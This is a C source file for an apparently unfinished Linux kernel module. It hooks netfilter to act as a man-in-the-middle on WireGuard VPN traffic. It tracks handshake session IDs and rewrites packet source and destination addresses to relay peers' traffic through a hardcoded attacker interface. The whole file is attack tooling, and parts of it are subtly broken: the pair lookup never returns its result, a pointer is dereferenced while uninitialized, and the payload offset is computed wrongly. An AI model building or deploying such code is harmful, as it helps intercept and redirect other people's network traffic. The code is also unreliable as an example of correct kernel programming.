#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/vmalloc.h>

static struct nf_hook_ops wg_mitm_hook;

static struct ring_buffer * wg_l_buf;

// figure out the hex for this
char * EXT_IFACE = "192.168.122.60";

// minimum size for Wireguard packet
// double check this
// cookie repsonse + 8 bytes UDP header
int WG_MIN_SIZE = 56;

struct wg_tuple {
   uint32_t id;
   uint32_t ip_addr;
};

struct peer_serv_pair {
   struct wg_tuple peer;
   struct wg_tuple serv;
};

struct ring_buffer {
   uint8_t tail;
   struct peer_serv_pair list[256];
};

struct ring_buffer * make_wg_buf_mem(void) 
{
   /*
   struct ring_buffer * list;
   *shmid = shm_open("wg-attack", O_RDWR, NULL);
   if(shmid < 0) {
      // put some error check here
   }
   struct stat map_stat;
   if(fstat(shmid, &map_stat) < 0) {
      // get info for shared memory
      // error check here
   }
   if(map_stat.st_size < sizeof(struct ring_buffer)) {
      // if too small
      // error check here
   }
   size_t mem_size = sizeof(struct ring_buffer);
   list = mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_SHARED, shmid, 0);
   return list;
   */

   struct ring_buffer * ptr = vzalloc(sizeof(struct ring_buffer));
   return ptr;
}

void kill_wg_buf_mem(struct ring_buffer * list)
{
   /*
   if(munmap(list, sizeof(struct ring_buffer)) < 0) {
      // error handling shit here
   }
   close(*shmid);
   return;
   */
   kvfree(list);
   return;
}

int find_pair(struct ring_buffer * list, uint32_t * idx, struct peer_serv_pair * pair) 
{
   uint8_t ptr = list->tail - 1;
   while(list->list[ptr].peer.id != 0) {
      if(list->list[ptr].peer.id == *idx) {
         pair = &(list->list[ptr]);
         return 0;
      }
      if(list->list[ptr].serv.id == *idx) {
         pair = &(list->list[ptr]);
         return 1;
      }
      if(ptr == list->tail) {
         break;
      }
      ptr--;
   }
   pair = NULL;
   return -1;
}

void add_peer(struct ring_buffer * list, uint32_t * id, uint32_t * ip) 
{
   list->list[list->tail].peer.id = *id;
   list->list[list->tail].peer.ip_addr = *ip;
   list->tail++;
}

struct peer_serv_pair * add_serv(struct ring_buffer * list, uint32_t * p_id, uint32_t * s_id, uint32_t * s_ip) 
{
   struct peer_serv_pair * pair;
   if(find_pair(list, p_id, pair) < 0) {
      return NULL;
   }
   pair->serv.id = *s_id;
   pair->serv.ip_addr = *s_ip;
   return pair;
}
   
unsigned int wg_handler(void * priv, struct sk_buff * skb, const struct nf_hook_state * state)
{
   if(!skb) return NF_ACCEPT;

   struct iphdr * iph = ip_hdr(skb);
   if(iph->protocol == IPPROTO_UDP) {
      struct udphdr * udph = udp_hdr(skb);
      if(ntohs(udph->len) >= WG_MIN_SIZE) {
         uint8_t * payload = (uint8_t *)(udph + sizeof(struct udphdr));
         // uint8_t * tail = (uint8_t *)(udph + ntohs(udph->len));
         // Ought to be 0x0n 0x00 0x00 0x00 (n 1, 2, 4)
         // Host endianness is least significant byte first
         if(*(uint32_t *)(payload) <= 4) {
            struct ring_buffer * list = wg_l_buf;
            struct peer_serv_pair * pair;
            uint32_t *id_send, *id_recv;

            uint8_t wg_type = *(uint8_t *)(payload);
            switch(wg_type) { 
               // WG handshake step 1
               case 1: 
                  id_send = (uint32_t *)(payload + 4);
                  add_peer(list, id_send, &(iph->saddr));
                  iph->saddr = in_aton(EXT_IFACE);
                  return NF_ACCEPT;
                  break;
               // WG handshake step 2
               case 2: 
                  id_send = (uint32_t *)(payload + 4);
                  id_recv = (uint32_t *)(payload + 8);
                  pair = add_serv(list, id_recv, id_send, &(iph->saddr));
                  if(pair == NULL) {
                     return NF_DROP;
                  }//endif
                  iph->saddr = in_aton(EXT_IFACE);
                  iph->daddr = pair->peer.ip_addr;
                  // get id_recv ip address
                  return NF_ACCEPT; 
                  break;
               // WG data transfer
               case 4: 
                  struct wg_tuple *src = NULL;
                  struct wg_tuple *dst = NULL;
                  id_recv = (uint32_t *)(payload + 4);
                  int peer = find_pair(list, id_recv, pair);
                  if(peer == 1) {
                     src = &(pair->peer);
                     dst = &(pair->serv);
                  } else if(peer == 0) {
                     src = &(pair->serv);
                     dst = &(pair->peer);
                  } else {
                     return NF_DROP;
                  } //endifelse
                  iph->daddr = dst->ip_addr;
                  if(src->ip_addr != iph->saddr) {
                     src->ip_addr = iph->saddr;
                  }//endif
                  iph->saddr = in_aton(EXT_IFACE);
                  break;
               default: 
                  // case 3, this is not wireguard
                  return NF_ACCEPT;
            }
         }//endif
      }//endif
   }//endif
   return NF_ACCEPT;
}

int register_filter(void)
{
   /*
   int shmid = shm_open("wg_attack", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
   if(shmid < 0) {
      // didn't work
      return 0;
   }
   if(ftruncate(shmid, sizeof(struct ring_buffer)) < 0) {
      shm_unlink("wg_attack");
      return 0;
   }
   */

   wg_l_buf = make_wg_buf_mem();

   wg_mitm_hook.hook = wg_handler;
   wg_mitm_hook.hooknum = NF_INET_PRE_ROUTING;
   wg_mitm_hook.pf = PF_INET;
   wg_mitm_hook.priority = NF_IP_PRI_FIRST;
   nf_register_net_hook(&init_net, &wg_mitm_hook);

   return 0;
}

void remove_filter(void)
{
   // shm_unlink("wg-attack");
   nf_unregister_net_hook(&init_net, &wg_mitm_hook);
   kill_wg_buf_mem(wg_l_buf);
   return;
}

module_init(register_filter);
module_exit(remove_filter);

